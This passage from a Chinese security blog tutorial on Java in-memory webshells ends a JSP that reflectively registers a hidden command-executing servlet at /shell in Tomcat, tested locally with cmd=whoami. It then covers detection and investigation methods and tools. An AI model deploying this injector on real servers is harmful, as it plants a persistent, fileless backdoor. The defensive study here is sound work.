style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">            String</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> output</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> s</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">hasNext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">() </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">?</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> s</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">next</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">() </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">            PrintWriter</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> out</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> servletResponse</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getWriter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">();</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">            out</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">println</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(output);</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">            out</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">flush</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">();</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">            out</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">close</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">();</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        @</span><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;">Override</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        public</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> String</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> getServletInfo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">            return</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> null</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        @</span><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;">Override</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> void</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> destroy</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    }</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    // 获取StandardContext</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">    StandardContext</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> standardCtx </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> null</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">    ServletContext</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> servletContext </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> request</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getServletContext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">();</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">    Field</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> appContextField </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> servletContext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getClass</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">().</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getDeclaredField</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;context&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">    appContextField</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setAccessible</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">true</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">    Object</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> appContext </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> appContextField</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">get</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(servletContext);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">    Field</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> standardCtxField </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> appContext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getClass</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">().</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getDeclaredField</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;context&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">    standardCtxField</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setAccessible</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">true</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    standardCtx </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> (StandardContext) </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">standardCtxField</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">get</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(appContext);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    if</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> (standardCtx </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">!=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> null</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">) {</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">        // 用Wrapper对其进行封装</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">        org</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">apache</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">catalina</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">Wrapper</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> newWrapper </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> standardCtx</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">createWrapper</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">();</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">        newWrapper</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;summermemshel&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">        newWrapper</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setLoadOnStartup</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">        newWrapper</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setServlet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(servlet);</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">        newWrapper</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setServletClass</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">servlet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getClass</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">().</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">());</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">        // 添加封装后的恶意Wrapper到StandardContext的children当中</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">        standardCtx</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">addChild</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(newWrapper);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">        // 添加ServletMapping将访问的URL和Servlet进行绑定</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">        standardCtx</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">addServletMappingDecoded</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;/shell&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;summermemshel&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    } </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">else</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">        out</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">println</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;Failed to get StandardContext&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>新建一个 <code>index.jsp</code> 文件, 将上述代码贴在其中</p><p>访问 <code>http://localhost:8080/java-memshell-tomcat-servletapi/index.jsp</code></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409111438611.png" alt="image-20240911143825536"></p><p>验证 servletapi 内存马: <code>http://localhost:8080/java-memshell-tomcat-servletapi/shell?cmd=whoami</code></p><blockquote><p>不可以加 <code>/index.jsp</code>, 否则会 404</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409111814029.png" alt="image-20240911181416841"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409111814471.png" alt="image-20240911181437409"></p></blockquote><p>使用新增servlet的方式就需要绑定指定的URL</p><p>如果我们想要更加隐蔽，做到内存马与URL无关，无论这个URL是原生servlet还是某个struts action，甚至无论这个url是否真的存在，只要我们的请求传递给tomcat，tomcat就能相应我们的指令，那就得通过注入新的或修改已有的filter或者listener的方式来实现了。</p><blockquote><p>比如早期 rebeyond 师傅开发的 memshell，就是通过修改 <code>org.apache.catalina.core.ApplicationFilterChain</code> 类的 <code>internalDoFilter</code> 方法来实现的，后期冰蝎最新版本的内存马为了实现更好的兼容性，选择 hook <code>javax.servlet.http.HttpServlet#service</code> 函数，在 weblogic 选择hook <code>weblogic.servlet.internal.ServletStubImpl#execute</code> 函数。</p></blockquote><hr><h2 id="检测与排查" tabindex="-1"><a class="header-anchor" href="#检测与排查"><span>检测与排查</span></a></h2><blockquote><p><a href="https://www.freebuf.com/articles/web/274466.html" target="_blank" rel="noopener noreferrer">一文看懂内存马 - FreeBuf网络安全行业门户</a></p><p><a href="https://micgo.top/java-security/%E5%86%85%E5%AD%98%E9%A9%AC%E6%A3%80%E6%B5%8B%E5%92%8C%E6%8E%92%E6%9F%A5/" target="_blank" rel="noopener noreferrer">内存马检测与排查 | micgo&#39;s blog</a></p><p><a href="https://gv7.me/articles/2020/kill-java-web-filter-memshell/" target="_blank" rel="noopener noreferrer">查杀Java web filter型内存马 | 回忆飘如雪 (gv7.me)</a></p><p><a href="https://gv7.me/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/" target="_blank" rel="noopener noreferrer">Filter/Servlet型内存马的扫描抓捕与查杀 | 回忆飘如雪 (gv7.me)</a></p><blockquote><p>TODO: <a href="https://mp.weixin.qq.com/s/Xwin11WA-f1JneAybh_pkg" target="_blank" rel="noopener noreferrer">HW中盛行的Java内存马，如何全面检测？ (qq.com)</a></p></blockquote></blockquote><hr><h3 id="源码检测" tabindex="-1"><a class="header-anchor" href="#源码检测"><span>源码检测</span></a></h3><p>在 Java 中，只有被JVM加载后的类才能被调用，或者在需要时通过反射通知JVM加载。</p><p>所以特征都在内存中，表现形式为被加载的class。</p><p>需要通过某种方法获取到JVM的运行时内存中已加载的类， Java本身提供了Instrumentation类来实现运行时注入代码并执行，因此产生一个检测思路：<code>注入jar包-&gt; dump已加载class字节码-&gt;反编译成java代码-&gt; 源码webshell检测</code></p><p>这样检测比较消耗性能，我们可以缩小需要进行源码检测的类的范围，通过如下的筛选条件组合使用筛选类进行检测:</p><ul><li>新增的或修改的</li><li>没有对应class文件的</li><li>xml配置中没注册的</li><li>冰蝎等常见工具使用的</li><li>filterchain中排第一的filter类</li></ul><p>还有一些比较弱的特征可以用来辅助检测，比如类名称中包含shell或者为随机名，使用不常见的classloader加载的类等等</p><p>另外，有一些工具可以辅助检测内存马，如 <a href="https://github.com/c0ny1/java-memshell-scanner" target="_blank" rel="noopener noreferrer">java-memshell-scanner</a> 是通过jsp扫描应用中所有的filter和servlet，然后通过名称、对应的class是否存在来判断是否是内存马</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409120935287.png" alt="img"></p><hr><h3 id="内存马排查" tabindex="-1"><a class="header-anchor" href="#内存马排查"><span>内存马排查</span></a></h3><p>如果我们通过检测工具或者其他手段发现了一些内存webshell的痕迹，需要有一个排查的思路来进行跟踪分析，也是根据各类型的原理，列出一个排查思路。</p><ul><li><p>如果是jsp注入，日志中排查可疑jsp的访问请求</p></li><li><p>如果是代码执行漏洞，排查中间件的error.log，查看是否有可疑的报错，判断注入时间和方法</p><p>根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。</p></li><li><p>如果是servlet或者spring的controller类型，根据上报的webshell的url查找日志（日志可能被关闭，不一定有），根据url最早访问时间确定被注入时间。</p></li><li><p>如果是filter或者listener类型，可能会有较多的404但是带有参数的请求，或者大量请求不同url但带有相同的参数，或者页面并不存在但返回200</p></li></ul><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409120942966.png" alt="image-20240912094230888"></p><hr><h2 id="相关链接" tabindex="-1"><a class="header-anchor" href="#相关链接"><span>相关链接</span></a></h2><ul><li><a href="https://su18.org/post/memory-shell/#%E5%89%8D%E8%A8%80" target="_blank" rel="noopener noreferrer">JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)</a></li><li><a href="https://github.com/su18/MemoryShell" target="_blank" rel="noopener noreferrer">su18/MemoryShell: JavaWeb MemoryShell Inject/Scan/Killer/Protect Research &amp; Exploring (github.com)</a></li><li><a href="https://github.com/Getshell/Mshell" target="_blank" rel="noopener noreferrer">Getshell/Mshell: Memshell-攻防内存马研究 (github.com)</a></li><li><a href="https://github.com/pen4uin/java-memshell-generator" target="_blank" rel="noopener noreferrer">pen4uin/java-memshell-generator: 一款支持自定义的 Java 内存马生成工具｜A customizable Java in-memory webshell generation tool. (github.com)</a></li><li><a href="https://github.com/W01fh4cker/LearnJavaMemshellFromZero" target="_blank" rel="noopener noreferrer">W01fh4cker/LearnJavaMemshellFromZero: 【三万字原创】完全零基础从0到1掌握Java内存马，公众号：追梦信安 (github.com)</a></li><li><a href="https://xz.aliyun.com/t/13638?u_atoken=f94be6653218aa4ad31b48985b8db228&amp;u_asession=01G_otl48uZbhtFS0zTvraxCTpL775ryvn2BCv_urM3wJZocetiIjcTkGZHTHzr0sFJB-YY_UqRErInTL5mMzm-GyPlBJUEqctiaTooWaXr7I&amp;u_asig=05WFvKOct9DmHgJDMC2jUSYI-d12JjWIBFR_2C9LIG1Qy7HuQAgqufwFJtgwT7YYpzeWrUbOQgtRqHtznbYOeIzfOE3faK3Wv5cAgyU_aN0MZzSsimizOQey5k3rVs39J4bkoyz_cmodpJV__z1NxPgwNJLrNXIpCieZ_o8bIP-oXBzhvSc0Kr8URjOX9Xe4tkoZl-WF4u8ydejJuYPCesMD19Q38FK8cvAidY-tr1msXw7V-flYvqbShJOEtrJHuurp1rJwV6NFU5VfQC_Po_bX3JX0FBQ6mF-iZLbT5R6TF6gx6UxFgdF3ARCQ86jS_u_XR5hatHQVh06VuUZ-D1wA&amp;u_aref=Tpg%2FOCFFpc8Ne9BDq2Y0iKlFyEs%3D#toc-23" target="_blank" rel="noopener noreferrer">零基础从0到1掌握Java内存马（1） - 先知社区 (aliyun.com)</a></li></ul><hr>`,38))])}const v=r(o,[["render",c],["__file","index.html.vue"]]),y=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/","title":"Java内存马","lang":"zh-CN","frontmatter":{"category":["网络安全","Web安全","Java"],"tags":["内存马"],"description":"Java内存马 一文看懂内存马 - FreeBuf网络安全行业门户 Java内存马 概述 JavaWeb内存马分类 Java Web 三大件 Servlet 请求的处理过程 Servlet 生命周期 Filter Filter的基本工作原理 Filter的生命周期 Filter链 Listener Servlet容器 Tomcat Tomcat架构设计...","head":[["meta",{"property":"og:url","content":"https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/"}],["meta",{"property":"og:site_name","content":"DailyNotes"}],["meta",{"property":"og:title","content":"Java内存马"}],["meta",{"property":"og:description","content":"Java内存马 一文看懂内存马 - FreeBuf网络安全行业门户 Java内存马 概述 JavaWeb内存马分类 Java Web 三大件 Servlet 请求的处理过程 Servlet 生命周期 Filter Filter的基本工作原理 Filter的生命周期 Filter链 Listener Servlet容器 Tomcat Tomcat架构设计..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"http://cdn.ayusummer233.top/DailyNotes/202409101616577.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-04-17T03:32:15.000Z"}],["meta",{"property":"article:tag","content":"内存马"}],["meta",{"property":"article:modified_time","content":"2025-04-17T03:32:15.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Java内存马\\",\\"image\\":[\\"http://cdn.ayusummer233.top/DailyNotes/202409101616577.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409101616839.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409101620154.jpeg\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409231703391.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409231701665.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409241528634.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409241548399.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409271130543.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409241634869.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409241634960.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409291130585.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409301705658.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410071915963.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410081826508.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410081826652.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410091412648.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409111437463.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409111438611.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409111814029.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409111814471.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409120935287.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409120942966.png\\"],\\"dateModified\\":\\"2025-04-17T03:32:15.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"咸鱼型233\\",\\"url\\":\\"https://233official.github.io/dailynotes/\\"}]}"]],"date":"2024-09-02T07:02:16.000Z"},"headers":[{"level":2,"title":"概述","slug":"概述","link":"#概述","children":[]},{"level":2,"title":"JavaWeb内存马分类","slug":"javaweb内存马分类","link":"#javaweb内存马分类","children":[]},{"level":2,"title":"Java Web 三大件","slug":"java-web-三大件","link":"#java-web-三大件","children":[{"level":3,"title":"Servlet","slug":"servlet","link":"#servlet","children":[]},{"level":3,"title":"Filter","slug":"filter","link":"#filter","children":[]},{"level":3,"title":"Listener","slug":"listener","link":"#listener","children":[]}]},{"level":2,"title":"Servlet容器","slug":"servlet容器","link":"#servlet容器","children":[{"level":3,"title":"Tomcat","slug":"tomcat","link":"#tomcat","children":[]}]},{"level":2,"title":"JavaWeb内存马领域的一些常见概念","slug":"javaweb内存马领域的一些常见概念","link":"#javaweb内存马领域的一些常见概念","children":[{"level":3,"title":"Java反射","slug":"java反射","link":"#java反射","children":[]},{"level":3,"title":"java instrumentation","slug":"java-instrumentation","link":"#java-instrumentation","children":[]}]},{"level":2,"title":"Servlet API 型内存马","slug":"servlet-api-型内存马","link":"#servlet-api-型内存马","children":[{"level":3,"title":"Servlet API 型内存马的一些相关概念","slug":"servlet-api-型内存马的一些相关概念","link":"#servlet-api-型内存马的一些相关概念","children":[]},{"level":3,"title":"Servlet 3.0+ 提供动态注册机制","slug":"servlet-3-0-提供动态注册机制","link":"#servlet-3-0-提供动态注册机制","children":[]},{"level":3,"title":"Filter 内存马","slug":"filter-内存马","link":"#filter-内存马","children":[]},{"level":3,"title":"Servlet内存马","slug":"servlet内存马","link":"#servlet内存马","children":[]},{"level":3,"title":"Listener内存马","slug":"listener内存马","link":"#listener内存马","children":[]},{"level":3,"title":"总结","slug":"总结","link":"#总结","children":[]}]},{"level":2,"title":"控制器,拦截器,管道","slug":"控制器-拦截器-管道","link":"#控制器-拦截器-管道","children":[{"level":3,"title":"Spring Controller 内存马","slug":"spring-controller-内存马","link":"#spring-controller-内存马","children":[]},{"level":3,"title":"Spring Interceptor 内存马","slug":"spring-interceptor-内存马","link":"#spring-interceptor-内存马","children":[]},{"level":3,"title":"Tomcat 